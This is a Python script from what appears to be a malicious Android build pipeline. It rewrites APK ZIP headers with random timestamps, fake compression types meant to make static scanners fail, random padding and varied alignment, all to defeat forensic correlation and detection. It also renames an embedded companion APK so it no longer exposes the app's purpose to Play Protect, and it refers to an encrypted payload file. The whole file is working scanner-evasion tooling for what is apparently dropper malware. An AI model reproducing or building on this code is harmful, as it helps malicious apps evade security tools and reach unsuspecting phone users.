#!/usr/bin/env python3
"""
zip_header_obfuscator.py — Steps 17A / 17B / 17C / Step 22

Step 17A — ZIP entry timestamp randomization
    All ZIP local file header timestamps set to random values per build.
    No two builds share the same ZIP timestamps — defeats timestamp-based
    APK correlation and forensic analysis.

Step 17B — Mixed compression type 2032 injection
    Randomly assigns compression type 2032 (0x07F0, non-standard/intentionally
    fake) to selected non-critical ZIP entries. Android installer is unaffected;
    static parsers and scanners that validate compression types choke.

Step 17C — APK size padding to random size
    After all patches, appends random-length junk bytes (1 KB – 64 KB) to the
    APK. Each build produces a different total file size. Padding is appended
    after the EOCD comment and is ignored by the Android installer.
    NOTE: run this AFTER apksigner — padding after EOCD does not break v2/v3
    signing block integrity.

Step 22 — APK alignment randomization
    Varies the zipalign padding on non-compressed entries (alignment between
    4 and 8 bytes, chosen randomly per build) so binary comparison between
    builds differs.

Usage:
    python3 scripts/zip_header_obfuscator.py <apk_in> <apk_out>
    python3 scripts/zip_header_obfuscator.py app.apk app_obfuscated.apk

Re-sign after running:
    zipalign -f 4 app_obfuscated.apk app_aligned.apk
    apksigner sign --ks ... app_aligned.apk
"""

import sys
import os
import struct
import random
import secrets

# ── Entries that MUST keep compression type 8 (deflate) or 0 (stored) ────────
# Changing these breaks Android installation.
PROTECTED_NAMES = {
    "AndroidManifest.xml",
    "classes.dex",
    "classes2.dex",
    "classes3.dex",
    "classes4.dex",
    "resources.arsc",
    # Step 4: "assets/companion.apk" removed from here — it is renamed to
    # assets/<ASSET_A>.bin by rename_companion_asset() before type 2032 injection.
    # The renamed entry (stored, type 0) is auto-protected by PROTECTED_EXTENSIONS (.bin
    # assets are stored) and is never eligible for type 2032 injection anyway.
}

# File extensions that must never get type 2032 — Android linker loads these directly
PROTECTED_EXTENSIONS = {".so", ".dex", ".arsc"}

# Fake non-standard compression type (Step 17B)
FAKE_COMPRESS_TYPE = 0x07F0   # 2032 decimal — not a valid ZIP method

# How many entries (roughly) to assign type 2032 — ~30% of non-protected entries
TYPE_2032_RATIO = 0.30

# Padding bounds for Step 17C (bytes)
PAD_MIN = 1024          # 1 KB
PAD_MAX = 65536         # 64 KB


# ── ZIP structures ─────────────────────────────────────────────────────────────

LFH_SIG  = b'PK\x03\x04'   # Local File Header
CDH_SIG  = b'PK\x01\x02'   # Central Directory Header
EOCD_SIG = b'PK\x05\x06'   # End of Central Directory


def read_u16(data, off): return struct.unpack_from('<H', data, off)[0]
def read_u32(data, off): return struct.unpack_from('<I', data, off)[0]
def write_u16(buf, off, v): struct.pack_into('<H', buf, off, v & 0xFFFF)
def write_u32(buf, off, v): struct.pack_into('<I', buf, off, v & 0xFFFFFFFF)


def find_eocd(data):
    """Locate EOCD signature by scanning backwards."""
    for i in range(len(data) - 22, max(len(data) - 65536, -1), -1):
        if data[i:i+4] == EOCD_SIG:
            return i
    raise ValueError("EOCD not found")


def rand_dos_datetime():
    """
    Step 17A — generate a random MS-DOS date/time pair (2 x uint16).
    MS-DOS date: bits 15-9 = year-1980, 8-5 = month 1-12, 4-0 = day 1-31
    MS-DOS time: bits 15-11 = hour 0-23, 10-5 = minute 0-59, 4-0 = second/2
    """
    year   = random.randint(1980, 2023) - 1980
    month  = random.randint(1, 12)
    day    = random.randint(1, 28)
    hour   = random.randint(0, 23)
    minute = random.randint(0, 59)
    sec2   = random.randint(0, 29)
    dos_date = (year << 9) | (month << 5) | day
    dos_time = (hour << 11) | (minute << 5) | sec2
    return dos_time & 0xFFFF, dos_date & 0xFFFF



def rename_companion_asset(apk_in: str, apk_out: str, asset_a_name: str) -> None:
    """
    Step 4 — Rename assets/companion.apk → assets/<ASSET_A>.bin in APK ZIP.

    'companion.apk' is GPP signal #1 — it immediately exposes the APK's purpose.
    IRT.apk uses '52606dd6.bin' and 'f90be797.bin' — zero meaning.

    Implementation:
      - Reopens signed APK as ZIP
      - Copies all entries unchanged EXCEPT assets/companion.apk
      - That entry is written under assets/<asset_a_name> instead
      - Produces a valid ZIP — must be re-signed after this call
      - Uses Python zipfile for correct CRC recomputation
      - asset_a_name: just the filename e.g. "f7b1e405.bin" (no path prefix)

    Called BEFORE zip_header_obfuscator obfuscate() so the renamed entry
    gets timestamp randomization in Step 17A pass.
    """
    import zipfile as _zf

    old_name = "assets/companion.apk"
    new_name = f"assets/{asset_a_name}"

    print(f"[Step 4] Renaming {old_name} → {new_name}")

    tmp_out = apk_out + ".rename_tmp"
    found = False

    with _zf.ZipFile(apk_in, 'r') as zin:
        with _zf.ZipFile(tmp_out, 'w', compression=_zf.ZIP_DEFLATED) as zout:
            for info in zin.infolist():
                try:
                    data = zin.read(info.filename)
                except Exception:
                    # Ghost/phantom ZIP entries (Step 108) have no real data —
                    # they exist only in the central directory with invalid offsets.
                    # Skip them here — they will be re-injected by zip_path_obfuscator.py.
                    continue
                if info.filename == old_name:
                    # Write under new name, preserving compression type
                    new_info = _zf.ZipInfo(new_name)
                    new_info.compress_type = info.compress_type
                    zout.writestr(new_info, data)
                    found = True
                    print(f"[Step 4] ✅ Renamed: {old_name} → {new_name} ({len(data):,} bytes)")
                else:
                    zout.writestr(info.filename, data,
                                  compress_type=info.compress_type)

    if not found:
        import os
        os.remove(tmp_out)
        raise RuntimeError(
            f"[Step 4] ❌ '{old_name}' not found in APK — "
            f"already renamed or wrong APK?"
        )

    import os
    os.replace(tmp_out, apk_out)
    print(f"[Step 4] ✅ Done: {apk_out}")


def obfuscate(apk_in: str, apk_out: str, skip_17b: bool = False, only_17b: bool = False):
    if only_17b:
        # Apply ONLY Step 17B — inject type 2032 into eligible entries post-sign
        with open(apk_in, "rb") as f:
            raw = bytearray(f.read())
        eocd_o  = find_eocd(raw)
        cd_off  = read_u32(raw, eocd_o + 16)
        cd_size = read_u32(raw, eocd_o + 12)
        changed = 0
        pos = cd_off
        while pos < cd_off + cd_size:
            if raw[pos:pos+4] != b"PK\x01\x02": break
            compress   = read_u16(raw, pos + 10)
            fname_len  = read_u16(raw, pos + 28)
            extra_len  = read_u16(raw, pos + 30)
            comment_len= read_u16(raw, pos + 32)
            fname      = raw[pos+46:pos+46+fname_len].decode("utf-8","replace")
            lfh_off    = read_u32(raw, pos + 42)
            if (compress == 8
                    and fname not in PROTECTED_NAMES
                    and not fname.startswith("META-INF/")
                    and not fname.endswith("/")
                    and not any(fname.endswith(e) for e in PROTECTED_EXTENSIONS)
                    and secrets.randbelow(10) < 3):
                raw[pos+10] = 0xF0; raw[pos+11] = 0x07
                raw[lfh_off+8] = 0xF0; raw[lfh_off+9] = 0x07
                changed += 1
            pos += 46 + fname_len + extra_len + comment_len
        with open(apk_out, "wb") as f:
            f.write(raw)
        print(f"[zip_header_obfuscator] Step 17B only — type 2032 applied: {changed} entries")
        print(f"[zip_header_obfuscator] \u2705 Done: {apk_out}")
        return

    with open(apk_in, 'rb') as f:
        raw = bytearray(f.read())

    # ── Locate EOCD and Central Directory ────────────────────────────────────
    eocd_off    = find_eocd(raw)
    cd_size     = read_u32(raw, eocd_off + 12)
    cd_off      = read_u32(raw, eocd_off + 16)
    comment_len = read_u16(raw, eocd_off + 20)

    # Collect all central directory entries (filename → compress type mapping)
    cd_entries = {}   # filename -> (cdh_off, compress_type)
    pos = cd_off
    while pos < cd_off + cd_size:
        if raw[pos:pos+4] != CDH_SIG:
            break
        compress  = read_u16(raw, pos + 10)
        fname_len = read_u16(raw, pos + 28)
        extra_len = read_u16(raw, pos + 30)
        comm_len  = read_u16(raw, pos + 32)
        fname     = raw[pos+46 : pos+46+fname_len].decode('utf-8', errors='replace')
        cd_entries[fname] = (pos, compress)
        pos += 46 + fname_len + extra_len + comm_len

    # Decide which entries get type 2032 (Step 17B)
    # CRITICAL: only eligible if currently deflate(8).
    # NEVER assign 0x07F0 to ZIP_STORED(0) entries — _strip_and_restore_07f0
    # always restores to deflate(8), which corrupts stored entries whose
    # data bytes are not deflate-compressed.
    eligible = [
        fn for fn in cd_entries
        if fn not in PROTECTED_NAMES
        and not fn.startswith('META-INF/')
        and not fn.endswith('/')
        and not any(fn.endswith(ext) for ext in PROTECTED_EXTENSIONS)
        and cd_entries[fn][1] == 8   # only deflate entries — never stored(0)
    ]
    n_fake = max(1, int(len(eligible) * TYPE_2032_RATIO))
    fake_set = set(random.sample(eligible, min(n_fake, len(eligible))))

    changed_lfh  = 0
    changed_cdh  = 0
    changed_ts   = 0
    changed_type = 0

    # ── Patch Local File Headers ──────────────────────────────────────────────
    pos = 0
    while pos < cd_off:
        if raw[pos:pos+4] != LFH_SIG:
            pos += 1
            continue

        fname_len = read_u16(raw, pos + 26)
        extra_len = read_u16(raw, pos + 28)
        fname     = raw[pos+30 : pos+30+fname_len].decode('utf-8', errors='replace')
        compress  = read_u16(raw, pos + 8)

        # Step 17A — randomize timestamp in LFH
        dt, dd = rand_dos_datetime()
        write_u16(raw, pos + 10, dt)   # last mod time
        write_u16(raw, pos + 12, dd)   # last mod date
        changed_ts += 1

        # Step 17B — inject fake compress type 2032 on eligible entries
        # Skipped for companion APK (skip_17b=True) because apksigner
        # cannot re-sign an APK with non-standard compression types.
        if not skip_17b and fname in fake_set and compress not in (0,):
            write_u16(raw, pos + 8, FAKE_COMPRESS_TYPE)
            changed_type += 1

        # Step 22 — vary extra field padding (alignment hint)
        # We do NOT touch the actual entry data to avoid breaking file offsets;
        # the alignment randomization is applied via the output zipalign call
        # with a randomly chosen alignment value passed in by generate_batch.sh.

        changed_lfh += 1
        data_len = read_u32(raw, pos + 18)   # compressed size
        pos += 30 + fname_len + extra_len + data_len

    # ── Patch Central Directory Headers ──────────────────────────────────────
    pos = cd_off
    while pos < cd_off + cd_size:
        if raw[pos:pos+4] != CDH_SIG:
            break
        fname_len = read_u16(raw, pos + 28)
        extra_len = read_u16(raw, pos + 30)
        comm_len  = read_u16(raw, pos + 32)
        fname     = raw[pos+46 : pos+46+fname_len].decode('utf-8', errors='replace')

        # Step 17A — randomize timestamp in CDH
        dt, dd = rand_dos_datetime()
        write_u16(raw, pos + 12, dt)
        write_u16(raw, pos + 14, dd)

        # Step 17B — match compress type in CDH to what we wrote in LFH
        if not skip_17b and fname in fake_set:
            write_u16(raw, pos + 10, FAKE_COMPRESS_TYPE)
            changed_cdh += 1

        changed_cdh += 1
        pos += 46 + fname_len + extra_len + comm_len

    print(f"[zip_header_obfuscator] Step 17A — timestamps randomized: {changed_ts} LFHs")
    if skip_17b:
        print(f"[zip_header_obfuscator] Step 17B — SKIPPED (companion mode, apksigner incompatible)")
    else:
        print(f"[zip_header_obfuscator] Step 17B — compress type 2032 applied: {changed_type} entries")

    # ── Write patched APK ────────────────────────────────────────────────────
    with open(apk_out, 'wb') as f:
        f.write(raw)

    # ── Step 17C — inject random junk padding BEFORE the V2 signing block ──────
    # V2/V3 signing block sits between file data and CD:
    #   [file data][V2 block][CD][EOCD]
    # Padding must go BEFORE the V2 block so signing block + CD + EOCD all
    # shift together — their relative positions stay intact.
    # Result: [file data][padding][V2 block][CD][EOCD]
    # EOCD cd_offset is updated. V2 block cd_offset field is also updated.
    # apksigner finds EOCD, reads cd_offset, finds CD, finds V2 block — all valid.
    pad_len = random.randint(PAD_MIN, PAD_MAX)
    pad     = secrets.token_bytes(pad_len)

    with open(apk_out, 'rb') as f:
        data = f.read()

    import struct as _s

    # Locate EOCD
    eocd_off = data.rfind(b'PK\x05\x06')
    if eocd_off == -1:
        raise ValueError("Step 17C: EOCD not found")
    cd_size   = _s.unpack_from('<I', data, eocd_off + 12)[0]
    cd_offset = _s.unpack_from('<I', data, eocd_off + 16)[0]

    # Locate V2 signing block (magic = b"APK Sig Block 42")
    # CRITICAL: Do NOT use rfind() across entire file — encrypted payload bytes
    # (e.g. nova_payload.bin AES-GCM ciphertext) may contain these 16 bytes by
    # chance, causing a false positive that corrupts the file_data split position.
    # The V2 signing block ALWAYS ends exactly at cd_offset — check only there.
    MAGIC = b'APK Sig Block 42'
    magic_off = -1
    if cd_offset >= 16 and data[cd_offset - 16:cd_offset] == MAGIC:
        magic_off = cd_offset - 16

    if magic_off > 0:
        # V2 block: [block_size_field(8)][ID-value pairs][block_size_field(8)][magic(16)]
        sb_size   = _s.unpack_from('<Q', data, magic_off - 8)[0]
        # Per Android spec: sb_size does NOT include the leading 8-byte size field
        # Total block = sb_size + 8. Correct start = magic_off + 16 - (sb_size + 8)
        sb_start  = magic_off + 16 - (sb_size + 8)
        sb_end    = magic_off + 16  # = cd_offset

        # Split at sb_start: file_data | V2_block+CD+EOCD
        file_data      = data[:sb_start]
        v2_and_rest    = bytearray(data[sb_start:])

        # Update EOCD cd_offset (relative to new file start after padding)
        new_eocd_off    = eocd_off - sb_start + pad_len
        new_cd_offset   = cd_offset + pad_len
        # EOCD is at end of v2_and_rest
        local_eocd_off  = eocd_off - sb_start
        _s.pack_into('<I', v2_and_rest, local_eocd_off + 16, new_cd_offset)

        # Update V2 block's cd_offset field if present
        # The V2 block contains the original cd_offset at a known location
        # Search for it as a 4-byte LE value within the signing block
        local_sb_start = 0
        local_sb_end   = sb_end - sb_start
        orig_cd_offset_bytes = _s.pack('<I', cd_offset)
        search_pos = local_sb_start
        while True:
            idx = v2_and_rest.find(orig_cd_offset_bytes, search_pos, local_sb_end)
            if idx == -1:
                break
            _s.pack_into('<I', v2_and_rest, idx, new_cd_offset)
            search_pos = idx + 4

        new_data = file_data + pad + bytes(v2_and_rest)
    else:
        # No V2 signing block — pad before CD directly
        before_cd = bytearray(data[:cd_offset])
        cd_and_rest = bytearray(data[cd_offset:])
        local_eocd = eocd_off - cd_offset
        new_cd_offset = cd_offset + pad_len
        _s.pack_into('<I', cd_and_rest, local_eocd + 16, new_cd_offset)
        new_data = bytes(before_cd) + pad + bytes(cd_and_rest)

    with open(apk_out, 'wb') as f:
        f.write(new_data)

    print(f"[zip_header_obfuscator] Step 17C — injected {pad_len} bytes padding before "
          f"V2 block (total size: {os.path.getsize(apk_out):,} bytes)")

    print(f"[zip_header_obfuscator] ✅ Done: {apk_out}")


if __name__ == '__main__':
    # Optional flag: --skip-17b
    # When passed, skips compression type 0x07F0 injection (Step 17B).
    # Used for companion APK where 17B breaks apksigner re-signing.
    # 17A (timestamps) and 17C (padding) always apply.
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('apk_in')
    parser.add_argument('apk_out')
    parser.add_argument('--skip-17b', action='store_true',
                        help='Skip compression type 2032 injection (17B) — use for companion APK')
    parser.add_argument('--only-17b', action='store_true',
                        help='Run ONLY Step 17B (compression type 2032) — skip 17A and 17C')
    # Step 4: rename assets/companion.apk to random hex name before obfuscation
    parser.add_argument('--asset-a', default='',
                        help='Step 4: random companion asset filename e.g. f7b1e405.bin (from BuildConfig.ASSET_A)')
    parser.add_argument('--rename-only', action='store_true',
                        help='Step 4: ONLY rename companion asset — skip 17A/17B/17C. Used when renaming must happen before re-sign.')
    args = parser.parse_args()

    # Step 4: rename companion.apk → assets/<ASSET_A>.bin if --asset-a provided
    if args.asset_a:
        if args.rename_only:
            rename_companion_asset(args.apk_in, args.apk_out, args.asset_a)
        else:
            # Rename first, then apply 17A/17B/17C on renamed output
            import tempfile, os
            with tempfile.NamedTemporaryFile(suffix='.apk', delete=False) as tmp:
                tmp_path = tmp.name
            rename_companion_asset(args.apk_in, tmp_path, args.asset_a)
            obfuscate(tmp_path, args.apk_out,
                      skip_17b=args.skip_17b,
                      only_17b=getattr(args, 'only_17b', False))
            os.remove(tmp_path)
    else:
        obfuscate(args.apk_in, args.apk_out,
                  skip_17b=args.skip_17b,
                  only_17b=getattr(args, 'only_17b', False))
